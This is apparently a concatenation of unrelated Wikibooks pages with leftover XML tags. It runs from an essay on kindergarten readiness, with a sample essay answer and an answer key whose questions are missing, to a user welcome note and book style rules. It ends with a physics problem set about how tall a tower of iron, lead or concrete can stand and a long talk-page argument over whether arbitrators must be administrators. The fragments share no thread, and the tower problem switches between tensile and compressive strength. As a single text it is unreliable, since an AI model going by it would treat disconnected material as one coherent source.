	Kindergarten is not the same as it was a few years ago.  It used to be used as a way to transition children into the regular routine of school to acquire the necessary social skills for the future.  Now it is full of academics.  If a student is lacking certain knowledge at the beginning of kindergarten, he or she is already behind.  Who knew a student could already be behind at the beginning of kindergarten?  With academics overriding social skills, kindergarten can seem very foreign to many parents (Plevyak &amp; Morris, 2002, pp.  23-26).  The shift is enormous.  Moreover, kindergarten has become an “integral part of the elementary school’s curriculum,” which is mainly cognitive or academic in approach (Nurss, 1987).  All the fun and excitement about going to kindergarten seems to be being overrun by pressures for success.  Students are going to have at least twelve more years to deal with hardcore academic pressures; kindergarten is not where it should start.  Furthermore, parents are their children’s first teacher and need to be aware of the presence of academics in their child’s kindergarten class to help them be better prepared (Hodges, 2000).  Educators need to provide parents with the knowledge of what is expected as the students enter and what will be expected as the students continue throughout kindergarten.  Working together is key! 

=='''Determining Kindergarten Readiness: Age or Skills'''==

		Now, lets address several key factors that affect kindergarten readiness.  Today, most schools use age as the ultimate factor of whether or not a child can go to kindergarten (Saluja, Scott-Little, &amp; Clifford, 2000).  For the most part, children have to be five years old by a certain date.  The dates for this cut-off vary widely, but can range from summer to December.  Researchers and teachers feel that a child’s chronological age should not be the only factor, and that previous experience in a school setting is a better readiness predictor (Nurss, 1987 and Hodges, 2000).  Since every child is different, age alone does not seem that it can absolutely define a child’s readiness.  Children need to be looked at as a whole.  Everything about the child needs to be ready for school, since this will be their first experience with school.  Likewise, there is so much variety of development that can be achieved for children between the ages of four and seven, that age seems to be very irrelevant (Dixon, 2007).  The school systems need to do away with age as the sole entrance requirement.  Schools need to acknowledge that kindergarten is more than just being old enough.  Students are immersed into very academic and unfamiliar environments.  Students need to be ready “physically, socially, and cognitively” and this takes time (www.parentcenter.babycenter.com, 2007).  Rushing children into situations they are not developmentally ready for will lead to failures and unnecessary stress for both parents and children.  Waiting for children to grasp certain social skills, for example, will better help them get along with other classmates and feel more successful.

=='''Determining Kindergarten Readiness: What qualities must a student have to be ready?'''==

Another factor that goes into deciding if a child is ready for kindergarten is what skills or qualities the child already has?  Is the child able to communicate his or her needs and wants?  Can the child follow simple directions?  These are some simple, but important skills that a child should possess prior to entrance into kindergarten.  Parents and educators seem to disagree on what the most important qualities a child should have acquired.  Parents focus on “pre-academic skills” while educators focus on “the child’s enthusiasm, effective communication, and appropriate behaviors” as most important (Protheroe, 2006, pp.  32-36).  If parents and educators cannot agree, how is a child going to be ready?  Parents and educators should work together to come up with objectives or standards of qualities that children should have before kindergarten.  This would help parents give their children a boost.  Some of the other qualities that most agree are critical to kindergarten readiness include: the child’s physical development, whether or not they can work cooperatively, as well as independently, and if they have an attention span of at least 15 to 20 minutes (Dixon, 2007 and Nurss, 1987).  These are just a few of the qualities that most teachers are looking for on the first day of kindergarten, but most of all they want children who are ready to learn.

=='''Determining Kindergarten Readiness: Parents or Educators'''==

	Lastly, who should get to make the decision of whether or not a child is ready for kindergarten, their parent or educators?  This is a tough question to answer.  Educators have the experience and knowledge about children, but parents know their child better than anyone (www.parentcenter.babycenter.com, 2007).  The decision should be made with as much collaboration between the two groups as possible.  Parents need to be aware of what the expectations are of the school their child will be attending and this could alleviate some of the mystery (Hodges, 2000).  Awareness is critical to helping a child be ready.  Schools need to do more to get their expectations across to parents in order to best serve future students.  Working together in this tough decision seems to be the best solution.

=='''What needs to be done to help ensure all children are ready for kindergarten?'''==

	Ensuring that all children are ready for kindergarten needs to be the responsibility of society.  This may seem like a burden to those without children, but research shows that those students who do better and have more fulfilling experiences in early preschool and elementary grades are not as costly on society in the future (Lynch, 2004/2005, pp.  26-35).  In turn, this benefits everyone.  Some suggestions on how to make kindergarten readiness obtainable for all children is to make preschool available for all children.  Even if children’s families can not afford preschool, the states need to have funds available to provide them with quality preschools.  Secondly, parents need to be made aware of what expectations their children will have in the kindergarten they will be attending.  Parents need to be invited into the class a year or so before their child will attend, in order to see what is going on.  Likewise, parents would be able to meet with teachers who can give them valuable information on activities they could do with their child (Protheroe, 2006, pp.  32-36).  This could also help to make parents feel more comfortable with the transition to kindergarten for their child and possibly make them more active in their child’s school career.  Lastly, preschool and kindergarten teachers need to come together and focus on solutions that they can do to ensure kindergarten readiness for all children (Fratt, 2005, pp.  31-33).  Kindergarten teachers can explain to preschool teachers skills that are expected and these can be incorporated into the preschool curriculum.  By working together, the students will definitely benefit.

=='''Conclusion'''==

	  Making sure children are ready for kindergarten is a task that should not be taken lightly.  If a child is not meeting the expectations in the beginning of their school experience, they are going to be behind for the remainder of their school years.  All of this leads to problems that possibly could have been avoided had a plan been in place.  Whether age or skills are chosen as the sign of kindergarten readiness or parents or educators decide if it is the child’s right time, one thing is the same--all children deserve to be equipped with the proper tools so they will be able to learn whenever the time is right.

=='''Essay Question'''==

Does a student’s readiness for kindergarten really affect his or her overall school experience or can the skills be made up with extra focus during school?  Explain your position with examples.


=='''Multiple Choice Answers'''==

1.  B

2.  A

3.  C

4.  C

5.  A


=='''Essay Question Sample Answer'''==

	A student’s readiness for kindergarten really does affect his or her overall school experience.  The degree of readiness that the child has achieved can be beneficial, as well as detrimental.  If a child is ready in physical, cognitive, and academic areas he or she will do great.  Having a positive first school experience will lead to a promising future during their school career.  But, if the child is lagging in his or her social skills, for example, this will be a disadvantage for the child which will lead to a less exciting first school experience.  This seems like a situation which could have been avoided with a little preparation.  Moreover, if a student comes to kindergarten without the expectations that teachers have, the student will already be behind before even really beginning school.  This could lead to feelings of failure and stress for the student.  The teacher and student would have to play catch-up which research has shown will only really amount to an achievement gap between the students who are adequately prepared for kindergarten and those who are not.  Likewise, the student never really is able to get to the levels that the other students who were ready are at.  Lastly, when students have achieved kindergarten readiness, the teacher does not have to spend time helping them with remedial work and can then engage students in more in-depth activities, more hands-on activities, and cover more topics of interest of the students.  The students will have more time to explore which can keep them from becoming bored which leads to behavior problems and less excitement about school.  Parents, educators, and society need to come together to focus on the far-reaching effects that children who have obtained the necessary attributes to be considered ready for kindergarten can have.  These qualities can lead to either positive or negative experiences for the students.  Everyone will agree positive experiences are the goal!

Hello Arpgme!

Welcome to Wikibooks.  We are very pleased to have you here!  Before you do too much more on your Wikibook [[Jigo]], it would be a good idea for you to read the [[WB:NP|Naming Policy]].  I can help you move and rename the chapters in your book if you like, but it's not that hard, and it would be a good experience for you to try it yourself. -- [[User:Jomegat|Jim Thomas]] 03:17, 14 March 2007 (UTC)</text>

      <text xml:space="preserve">== Adopted Rules ==
If not stated otherwise here as a general rule, all guidelines from [[Wikibooks:Manual_of_Style]] are in effect.

=== Page naming and structure [[Image:yes check.svg|20px]]===

We are using the ''slash convention'' with a ''flat page structure'' as described in [[Wikibooks:Naming_policy]]

=== One book with many faces [[Image:yes check.svg|20px]]===

There are two indexed: A chapter-by-chapter version and a all-in-one page version (via transclusion). New pages should be added to both.

=== Size of pages [[Image:yes check.svg|20px]]===

A chapter indexed from the main page should be on one Page. However, no single page should be larger than about 30k. Larger pages should be split up.

=== Use specialized topics [[Image:yes check.svg|20px]]===

By adding contributions, try to help us give some structure to the book, do so by creating as much different and separate chapters/sections and sub-sections possible using unique (if doable) specialized topics so to give the reader the most complete and logic understanding of the language, your are also encouraged to add empty ones, so future contributors my add to them.

=== Authors section [[Image:yes check.svg|20px]]===

Every person making non-trivial changes to this book may add themselves to the [[The World of Peer-to-Peer (P2P)/Authors|Authors]] section. This can be done by adding your name/alias and including a link to one of your wikimedia page, web-page or an active email address where you can be reached.

'''Proposed:''' 19 Sept 2005 '''Voted:''' 21 September 2005 '''Moved to adopted by:''' --[[User:Panic2k4|Panic]] 04:24, 17 January 2006 (UTC)

=== Level 1 Heading Nummeration  [[Image:yes check.svg|20px]]===
We are using level 1 headers (&lt;nowiki&gt;=header=&lt;/nowiki&gt;) for the parts. To allow transclusion, main submodules should always start with and have at most 1 level 2 header (&lt;nowiki&gt;==header==&lt;/nowiki&gt;). 

'''Proposed:''' 20 Sept 2005 '''Not Contested''', '''Moved to adopted by:''' --[[User:Panic2k4|Panic]] 04:24, 17 January 2006 (UTC)

=== Source code style [[Image:yes check.svg|20px]]===

To allow adoption from other sources, there is no mandatory brace / indentation style throughout the book for code examples. However, please be consistent within one example.

There is a non adoption of a single standard on styles (ie: brace style) so to make the work of importing any other snips of code easier, it also shows readers all the options they can make, so you can use the style you prefer and modify any existing code on the book, but authors are not expected to follow a particular style.

=== Common Programming Errors [[Image:yes check.svg|20px]]===

Common programming errors should pointed out throughout the book.

===The Too-Tall Tower===
====Part 1. (Easy)====

1.) Consider a tall block of material with constant cross sectional area.  Since the block has mass, it exerts some amount of pressure on the material below it.  Ultimately at some height the object's own mass must cause the tower to crumble.  What is the height for a material with a density of &lt;math&gt;\rho&lt;/math&gt; and an ultimate tensile strength of &lt;math&gt;\sigma_t&lt;/math&gt; on a planet with gravity &lt;math&gt;g&lt;/math&gt;?

Compute the maximum heights in meters of the following substances:

*Iron
*Lead
*Concrete

====Part 2. (Medium)====

2.) Woah, that's pretty tall.  Over the course of several kilometers, obviously, the air pressure would weaken, so the tower ''could be'' a tad bit taller, considering that not as much pressure is pushing on the tower.  Since the tower is in the couple of mile tall range, the air pressure needs to be determined from tables.  [[w:Atmospheric Pressure]] lists the following equation:

There are two different equations for computing pressure at various height regimes below 86 km (or 278,400 feet).  Equation 1 is used when the value of standard temperature lapse rate is not equal to zero and equation 2 is used when standard temperature lapse rate equals zero.

Equation 1:
:&lt;math&gt;{P}=P_b \cdot \left[\frac{T_b}{T_b + L_b\cdot(h-h_b)}\right]^\frac{g_0 \cdot M}{R^* \cdot L_b}&lt;/math&gt;

Equation 2:
:&lt;math&gt;{P}=P_b \cdot \exp \left[\frac{-g_0 \cdot M \cdot (h-h_b)}{R^* \cdot T_b}\right]&lt;/math&gt;

where
:&lt;math&gt;P&lt;/math&gt; = Static pressure (pascals)
:&lt;math&gt;T&lt;/math&gt; = Standard temperature (kelvins)
:&lt;math&gt;L&lt;/math&gt; = Standard temperature lapse rate (kelvins per meter)
:&lt;math&gt;h&lt;/math&gt; = Height above sea level (meters)
:&lt;math&gt;R^*&lt;/math&gt; = Universal gas constant for air: 8.31432×10&lt;sup&gt;3&lt;/sup&gt;  N&amp;middot;m / (kmol&amp;middot;K)
:&lt;math&gt;g_0&lt;/math&gt; = Gravitational constant (9.80665 m/s²)
:&lt;math&gt;M&lt;/math&gt; = Molar mass of Earth's air (28.9644 g/mol)

The value of subscript ''b'' ranges from 0 to 6 in accordance with each of seven successive layers of the atmosphere shown in the table below.  In these equations, ''g''&lt;sub&gt;0&lt;/sub&gt;, ''M'' and ''R''&lt;sup&gt;*&lt;/sup&gt; are each single-valued constants, while ''P,'' ''L,'' ''T,'' and ''h'' are multivalued constants in accordance with the table below.  It should be noted that the values used for ''M,'' ''g''&lt;sub&gt;0&lt;/sub&gt;, and &lt;math&gt;R^*&lt;/math&gt; are in accordance with the U.S. Standard Atmosphere, 1976, and that the value for &lt;math&gt;R^*&lt;/math&gt; in particular does not agree with standard values for this constant.&lt;ref name=USSA1976&gt;[http://ntrs.nasa.gov/archive/nasa/casi.ntrs.nasa.gov/19770009539_1977009539.pdf U.S. Standard Atmosphere], 1976, U.S. Government Printing Office, Washington, D.C., 1976. (Linked file is very large.) &lt;/ref&gt;  The reference value for ''P&lt;sub&gt;b&lt;/sub&gt;'' for ''b'' = 0 is the defined sea level value, ''P&lt;sub&gt;0&lt;/sub&gt;'' = 101325 pascals or 29.92126 inHg.  Values of ''P&lt;sub&gt;b&lt;/sub&gt;'' of ''b'' = 1 through ''b'' = 6 are obtained from the application of the appropriate member of the pair equations 1 and 2 for the case when &lt;math&gt;h = h_{b+1}&lt;/math&gt;.:&lt;ref name=USSA1976/&gt;

'''''Assuming this table is accurate:'''''

Find a general value of the atmospheric pressure using the height you found previously with this formula.  Considering that the ultimate compressive strength was probably determined in a sea-level atmosphere, what's the new maximum height of these materials? 

====Part 3. (Medium Hard)====

3.)  That added a few meters.  Perhaps more interesting is the change of the earth's gravity.  Considering the earth's gravity changes as follows:

:&lt;math&gt;g\frac{R^2}{(R+h)^2} \, &lt;/math&gt;

Where:

*g is the gravity at a radius of R (i.e. the base of the tower)
*h is the height of a particle above the earth's surface
*R is the radius of the earth

Find the new maximum height in terms of the given quantities.  And toss on the atmospheric pressure as well.

====Part 4. (Hard)====

4.)  Well, that added a few more meteres as well.  But to truly increase the height, one would need a non-constant cross sectional area.  So, what if the tower was, in fact, a cone?  Find an equation relating the maximum height of the tower to the cone angle of the tower using the quantities given.  If the base of the tower could only be &lt;math&gt;D&lt;/math&gt; meters in diameter, what's the maximum height the tower can be (ignore the atmospheric pressure and gravity change, otherwise the integral is impossible to evaluate).

====Part 5. (Very Hard)====

5.) So while a cone could make for a very useful amount of height, what if you could pick any function for the area as a function of height?  Is it possible, using the weakening of the earth's gravitational field, to make a tower that could reach an indefinite height?  If not, what shape gives the maximum height of the tower, assuming that the diameter of the tower can't be greater then &lt;math&gt;D&lt;/math&gt;.  (Note:  No solution found so far).

I'll post the solutions later.  I did this problem as a mental exercise at one point so I know the towers generally hit a couple miles to almost a dozen miles for some of the lighter materials out there.

Why not ? --[[User:Panic2k4|Panic]] 04:57, 14 March 2007 (UTC)

:Arbitrators are enabled to impose binding restrictions, such as user blocks and page protections. The community only gives these privledges to sysops. A person who is not a sysop is not likely to understand how and when to use these tools, and a person who is qualified to become an arbiter is likely to already be qualified to become a sysop anyway. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 15:02, 14 March 2007 (UTC)

::Decisions can be enforced by request, the administrative flag is not needed in the proceedings (it could help but not having it shouldn't be the excluding factor). Many users don't want Administrative privileges (they don't need them or have the time to use them or even have lost the Arbitration flag to inertia), in any case arbitrators should not be selected by the community in general (or need their approval since decisions don't affect the community only the involved parties) but by the involved parts, how else can the decision be bounding ?  --[[User:Panic2k4|Panic]] 19:20, 14 March 2007 (UTC)
::More important yet, reducing decisions and rulings to a specific &quot;cast&quot; of users is dangerous, administrators don't have special status or a representative quality to the rest of the community.  --[[User:Panic2k4|Panic]] 19:24, 14 March 2007 (UTC)

:::Your objections are noteworthy, but arbitrators need to be trusted. Becoming a sysop by vote at [[WB:RFA]] is an indication of this trust. Users who don't want administrative privledges will likely not want the additional responsibility of being arbiters either. For such people, they could likely be mediators, but not arbiters. Being an arbiter requires trust, a good knowledge of wikibooks policy, and activity in the community. All of these things are already measured by sysop elections. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 19:45, 14 March 2007 (UTC)

::::Well by this you are implying that administrators have a special trust status, this is not correct, if we start extending administrators functions to tasks like this, the voting that gave them the sysop flag does not apply, they were entrusted the flag to a specific set of tasks changing the tasks also changes the needed attributes of the users performing them, as an example, several administrators do preform reasonably well the normal tasks (or the specific tasks they requested the flag for), but I wouldn't particularly trust them be impartial on every discussion or more importantly regarding lets say a dispute involving another administrators.
::::Don't get me started on this part &quot;Being an arbiter requires trust, a good knowledge of wikibooks policy, and activity in the community. All of these things are already measured by sysop elections.&quot; you did a 180dgr on that one recently and I have proven to you by now that not all administrators know what they are doing, votes for administrative flag will always pass people that shouldn't have them, there is nothing we can do about it, we can only make it more difficult, if I had the time I could prove that point to you but you understand what I'm saying.
::::By not allowing normal users to become arbitrators we change the &quot;will likely not want the additional responsibility&quot; to &quot;can't have additional responsibility&quot;, and this brings us back to what I said the community should not restrict who can or not be an arbitrator only the involved parts can (the community may comment on the selection).  --[[User:Panic2k4|Panic]] 20:13, 14 March 2007 (UTC)

::::: I think that whether the members have to be administrators or not depends on what the scope of the committee would be. Would they simply be enforcing the community decision or would they try and represent the community decision? I do not have a problem with a group of admins deciding, based on what the community has said before hand, what to do, and obviously only admins would have the power to block other users or use other tools as required if that is determined to be the best course of action. I also think that it would be necessary to have some group that is able to make the &quot;binding&quot; decisions, which everyone involved in the arbitration would respect, and I think that for the most part a group of admins would fit that. The previous arbitration was an example of what happens if there is no organization. That being said, I think we must be careful to allow the community at large to have some sort of say before the arbitrators make their decision because, as Panic brought up, many users who do not care to become administrators would nonetheless likely like to have their say in the cases, and may have valuable input and I do not think it would be wise to deny them... maybe a 2-step process would be better?
:::::I'm not sure I like the idea that the involved parties choose the arbitrators either because then I think it opens it up to a lot of neutrality disputes (from the opposite party); this is why at least in the U.S. the plaintiffs and defendants don't go out and choose 6 friends for the jury. They do, however, have the option to pick out the members that they ''dont'' want arbitrating, which I guess we could do but it depends on how many choices there are and what people think about modelling our legal system on that of the US. [[User:Mattb112885|Mattb112885]] &lt;small&gt;([[User talk:Mattb112885|talk]]) &lt;/small&gt; 22:02, 14 March 2007 (UTC)

::::If you look at the first line of the [[WB:ADMIN]] policy you will see the text: '''Administrators, or &quot;sysops&quot; are wikibookians who are generally well-known and trusted in the community, and who have had certain restrictions lifted at wikibooks.''' I am not making up the fact that administrators have a &quot;special trust status&quot;, it's written in the policy. Furthermore, we don't vote on admins who are not so trusted at the time of the election, and I can't think of a single admin who has failed community trust in any way. I have not done any 180dgr changes on this issue, my position has always been clear and solid on this position. I have no reason to mistrust any admins, nor do I believe that any of our current admins should not be admins. You, of course, may have different opinions on the matter and I do not grudge you those opinions after your situation.  
::::Normal users can have additional responsibilities if they show that they are trustworthy, good wikibookians, and if they accept their nominations. All other types of electons, bureaucrat and checkuser elections require the candidate to already be a sysop. You cannot be a checkuser if you are not previously a sysop. In a similar manner, Wikipedia typically requires that all arbiters are admins or bureaucrats. Of course, we don't have to do things like wikipedia does, but it is a model. Arbiters are likely to have more decision-making power then any bureaucrat or checkuser, and i see no reason why the requirements on them should be any less. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 22:15, 14 March 2007 (UTC)

:::::The issues aren't sequential, they are parallel to each other, yes, that is a rule of who should be an administrator (I have already pointed out several administrators that don't fill that description), trust is not a general definition, there are levels of trust and limits to the performance one can reach in distinct tasks, is more or less the problem of a vice-president to be by the force of circumstances made president, the legitimacy of the vote in that particular case is higher but serves to show the problem in your logic. (as for the 180º I'm referring to divergent posts you made on the vote for Administrator flags, if you don't recall you words I can provide links, but do you disagree that &quot;are generally well-known and trusted&quot; is not the same as &quot;must be well-known and trusted&quot;? that those criteria change in time? (that they erode or are boosted by the users actions)
:::::The checkuser flag is not the same (in regards to this discussion) I would have the same trouble in giving that flag by default to all administrators (without a vote).
:::::The bottom line is why must only administrators be able to perform as arbiters ? I have pointed out several problems with that limitation and up to now you have not provided a strong enough reason to be so, if the disputing users can chose freely a better judgment/service can be reached as a further example is having someone outside of wikibooks as an arbiter (requiring that only administrators perform the task would prevent it) --[[User:Panic2k4|Panic]] 23:00, 14 March 2007 (UTC)
:::::I was not addressing the rational of having stated on the policy that arbiters should only be agreed upon by the involved parties but there are several factors that would justify that also (it may depend on the number of arbiters or the level of the dispute) but forcing an arbitration and implementing the decisions against the agreement of those involved is the same as not providing a fair and just arbitration, to make it compulsive, would only lead to more troubles and would void the arbitration objectives, ultimately an arbitration can only occur if requested.  --[[User:Panic2k4|Panic]] 23:10, 14 March 2007 (UTC)

:I've answered your questions already. admins are trusted members of the community, and if you feel that an admin is not trusted, then nominate them for de-adminship. Barring such a nomination, the admins ''are considered to be trusted'', and i dont think it is your decision whether we continue that trend or not. your mistrust in the system, is an extraordinary situation, and i think it is a mistake to be shaping policy about admins because of personal grudges about particular admins. If you feel that a current admin has failed in his position, nominate them for de-adminship. If you don't make a nomination, then you should really stop making your comments and accusations about them.
:I have never made divergent posts on WB:RFA, and if you post links, i will post my clarifications. Any divergence you see in my posts are likely to be a misunderstanding, not a change in opinion.
:There are many reasons why arbiters should be sysops, and I have mentioned them all already:
:#Arbiters need to use admin tools
:#Admins are voted to be trusted, and versed in policy
:#Arbiters must know policy, because they have to enforce it. Admins are voted based on knowledge of policy.
:#people who want to be admins typically can be, so it isn't much of a hurdle.
:#People who do not want the responsibility of being an admin won't want the responsibility of being an arbiter (because arbiters likely have more responsibility, along with time-limits, etc).
:Don't ask again what the reasons are, here is the list. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 23:19, 14 March 2007 (UTC)

::Sorry if I'm making you lose your calm but this is a compartmentalized discussion, I'm not addressing the adminship status only your rational that only they can perform as arbiters.
::As for you posts on WB:RFA I will make a post on you talk page as it deals with you personal views and don't have a direct impact on this discussion.
::On the points:
::#Arbiters do not need admin tools, even the implementation of the decision may not require them.
::#Agree, but there are users that can also be trusted and versed on policy that aren't Admins.
::#If an Arbitration is initiated on the bases of a policy dispute I don't see what an Arbitration would address, an arbitration can't be used to create or refine policies. If a direct violation of policy is found the policy is used no further discussion is needed.
::#I also don't believe that the administrative flag should be given only on request (I will address it in the proper forum), the flag should be only given to users willing or needing to perform administrative tasks, it shouldn't be used as a ranking or status token.
::#Disagree, this is you personal filling, translating it to policy would indeed make it impossible.
::This is only an attempt to reach consensus on this very distinct point as it is I'm strongly opposed to that requirement and would oppose the policy.  --[[User:Panic2k4|Panic]] 23:49, 14 March 2007 (UTC)

:::I'm not losing my calm. 
:::#User blocks or page protections can be specified by arbiters, and arbitration is binding. That means that an arbiter ''can require'' that administrative tools should be used. The only people qualified to specify that admin tools should be used, and the only people qualified to make those decisions about the tools are admins. Therefore, an arbiter must be an admin, Q.E.D.
:::#Those people, if they are truely trusted and versed in policy can then easily become admins.
:::#Policy is intentially vague on a number of points, and it is up to the judgement of wikibookians as to how to interpret it. Arbiters will make binding interpretations of this sort, when required. For this reason it's important for arbiters to know and understand policy, not just the words of policy (which can be vague), but also the ''spirit of the policy'', which is frequently not written down.
:::#Administrative flag is not given on request, but people who are well-qualified typically receive the necessary votes. People who are not qualified, do not. Typically, people who are &quot;qualified&quot; have been active in cleanup and help work.
:::#You cannot be both ''A'' and ''not A''. You cannot both avoid responsibility, and at the same time want more responsibility. It's not my opinion, it's a logical fallacy. 
:::You can be opposed to this policy for any reason, i doubt a policy like this will ever make everybody happy. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 00:07, 15 March 2007 (UTC)

*reset

#That can basically be solved (and I think is already stated) on the text, that will make any admin requested to do so to perform the needed tasks. (better yet it will make them public knowledge and reduce the probability for abuses)
#Not all users chose to be admins (take me for example)
#Disagree, if we are aiming to make policies intentionally vage we are indeed doing a bad service to Wikibooks, the vagueness of polices should not enable personal judgments of any user about another, the only reason to leave something vage on a policy is error or inability to address all the points (that is why the policies can be redrafted) or to make it general any loophole as in normal law should not be used to validate disciplinary actions, that only leads to abuse. (That is why we shouldn't have to many policies and be as general as possible)
#I have already addressed this with you.
#Don't agree also, you can be a fireman but not a policeman, responsibility or capacity to address issues can't be generalized in such a way.
Well at least we can try to make is as fair and complete as possible :) --[[User:Panic2k4|Panic]] 02:05, 15 March 2007 (UTC)

:Just to address the issue at hand here, about the unique status of admins.  As originally conceived, the position of being an administrator was not really supposed to &quot;be a big deal&quot; (to quote the all-knowing Jimbo here).  It was conceived as merely somebody who has been participating long enough that we could acknowledge that they would not be able to harm the project through vandalism or other such patent nonsense.  And it was made a community recognition tool for &quot;promotion&quot; mainly to keep these same vandals from using automated process that would try and cheat the system.  Vandalism attacks that exploit the semi-protection system are an example of this sort of vandal gaming.
:Unfortunately, the status of becoming an admin has achieved some sort of aura that I simply can't account for here.  And the standards that are applied to somebody to become an admin are seemingly constantly raised.  I know this seems a little hypocritical her, because I have voted down some people who have applied for adminship in even the recent past for lack of experience.  I have especially gone hard after those individuals who seemingly want to have adminship on every possible project and are glory seekers.  The rationale of &quot;I'm an admin on project en.wiki???&quot; is not only useless as an argument now, it is a reason to reject the request.  If that is their only qualification, they really aren't a member of the community.
:And I'll admit, more and more is being dumped upon admins as more tools become available with the MediaWiki software, and this is one of the aspects that does go into why the standards are being raised.  This, together with the growing prominence of the Wikimedia projects where substantial changes to major pages will have a huge impact on outside perception of the project, causes a stronger view that only users who are very trusted ought to become admins.  So much so that I have even argued that some in-between stage ought to be made that is sort of a sub-admin, doing things like recent changes patrol (having the ability for a rapid revert), or being able to edit protected pages.  The proposal was shot down completely on en.wikipedia, but that doesn't mean it couldn't be recommended here.
:As far as having otherwise unique status with this Arbitration Committee, I think it would be essentially one and the same with at least the current group of admins if Wikibooks users were to try and choose who would be members of this committee through an independent process.  As a means to suggest who might be reasonable to consider for membership of this group of arbitors, the current group of admins is easy and doesn't require a whole other set of voting.  But I can also consider some individuals who have turned down adminship in the past that I may want to support for this very independent role.  The requirements for serving as an arbitor certainly could be different than those of being an administrator, and any decisions by these arbitors should be carried out by any admin once a decision is made.  It takes two very different sets of skills here and I don't think they are necessarily a one to one match.
:There needs to be more than one arbitor, even on any one given &quot;case&quot; or situation.  That above all else was my folly when I tried to deal with you Panic.  Once the arbitration started, I had no other solid defenders of what I was trying to accomplish and quite a few people who were against what I was doing.  I didn't expect the opposition to come from the individuals who fought against me and deliberately reversed my actions, nor did I expect the blatant wheel warring that resulted either.  The only way I felt I could have kept it going was to engage is a wholesale out right wheel war, and I wasn't prepared to do that, so I backed off instead.  If multiple individuals were involved from the beginning, I would have been able to have these individuals step in and &quot;take over&quot; if there were complaints about taking too much time to make a decision.  It also helps out in general for people to discuss complicated issues at length without feeling pressured to make a decision by one of the parties directly involved.  Or at least be able to tell those trying to force a decision to &quot;back off and let us get our thoughts together.&quot;  By myself, I was unable to do that.
:Above all else, I hope the need for arbitration is something that is a very rare event on Wikibooks, and when it is done it should be taken as the serious event that it implies.  Those who become arbitors should also get the full support of the rest of the community and be allowed to carry out whatever actions may be necessary and not fight them on every point that comes along.  --[[User:Robert Horning|Rob Horning]] 23:06, 15 March 2007 (UTC)
:I would fully support Panic's proposal.  The arbitrator needn't be an administrator and in fact in many cases an ordinary person would be better at the task.  Any decisions from the arbitration can be enforced by an administrator when the outcome is known.  How exactly is an administrator well-known and trusted?  We don't know who anyone is.

::That was the point I was defending and attempting to get a consensus on, in any case if [[User:Whiteknight]] blocks the arbitration policy on only that point I will concede that having only administrators as arbiters is better than have the policy blocked, even if I think we will weaken the policy by requiring it to be so, that was what I was attempting to obtain from anyone opposing such freedom and fair distribution of functions.  
::[[User:Robert Horning]] raises yet another point, what should be the minimum number of arbiters, I was set to defend that it could be only one, but in light of the points raised I will modify my view, but what would be a perfect number 2, 3+, even numbers can lead to tie about the decission, one can include in the policy a vote by majority from the community or something on those lines but that again (as events have shown) will only give voice to the active minority and permit a public trail without rules (like misrepresenting facts, or social engineering) that can lead to unfair result. I will start a new thread on that topic. --[[User:Panic2k4|Panic]] 00:43, 16 March 2007 (UTC)

== minimum number of arbiters ==  
What should be the best number and what to do if a tie or a block (depending on how we validate the decission) is the result of the arbitration.  --[[User:Panic2k4|Panic]] 00:43, 16 March 2007 (UTC)

One idea is to let the parties vote and if the votes are opposed they can be disregarded that would mean a more acceptable resolution to problems on reinforce the spirit of consensus. This also leads to the numbers of the users involved on a dispute will arbitration only address 1 vs 1 conflicts ? --[[User:Panic2k4|Panic]] 00:47, 16 March 2007 (UTC)

:I think the best idea would be to pick 3 or 5 arbiters from the pool of available arbiters for each case. These few arbiters could be selected by the two parties based on mutual agreement as to which arbiters are the least biased. I dont envision a standing committee of fixed size so much as I envision a pool of available arbiters, from whom an committee can be formed specially for each case. The benefit to this approach is that it prevents any one group of arbiters from being too &quot;powerful&quot;, and it also prevents arbiters who might be biased from participating in particular cases. To prevent ties, we would likely want to pick 3 or 5 (an odd number). --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 01:15, 16 March 2007 (UTC)

::I agree that arbiters shouldn't be a static pool or a standing committee.
::As for how they reach the decission I'm still torn, the idea above on having the targets of the decission express their votes is very appealing but would only work under consensus (the definition I use in the strict meaning), probably using some of the proposed restrictions I advance on my essay, would address any problems on using it as a method here.  --[[User:Panic2k4|Panic]] 01:27, 16 March 2007 (UTC)

:::If you want to talk about your &quot;strict meaning&quot; of consensus, you would likely cause less confusion if you said &quot;100% agreement&quot;. 
:::I think once the arbiters are selected, it can be left up to the arbiters how they come to a decision. I dont care whether the arbiters vote and follow the majority, or if they compromise and come to a joint decision.

== Seperate arbitration boards ==

I don't understand the need to have two isolated and distinct arbitration boards, one for content and the other for personality disputes.  If one (the [[Wikibooks:Editorial board]]) was already well established and functioning with a strong history, I might feel a bit different.  But that isn't the case here.

If there is in the future such a huge demand on the arbiters that they are feeling overwhelmed, perhaps a separation of responsibilities might be in line.  At the same time, I can see areas of responsibility overlapping and that becoming a point of contention between the two bodies, especially when such overlap is not necessary.

I know that Whiteknight has put quite a bit of effort into these proposals, and I don't want to disparage what he has put in here in this regard.  I also think there is a role that a content advisory group could offer that would be of significant benefit for helping with content development, and could offer support as a mediation body as well.  But I do believe that an arbitration body like this one really should be the &quot;ultimate&quot; authority even on content disputes, as any such major dispute would ultimately also involve personalities and other sorts of complaints that would go way beyond the realm of trying to decide who should have the last say with content.  --[[User:Robert Horning|Rob Horning]] 01:39, 16 March 2007 (UTC)

:Originaly the intent was to have two separate boards, but recently that idea has been abandoned. Unfortunately, following the discussions on these issues can be difficult as we end up discussing these kinds of things on a variety of talk pages. 
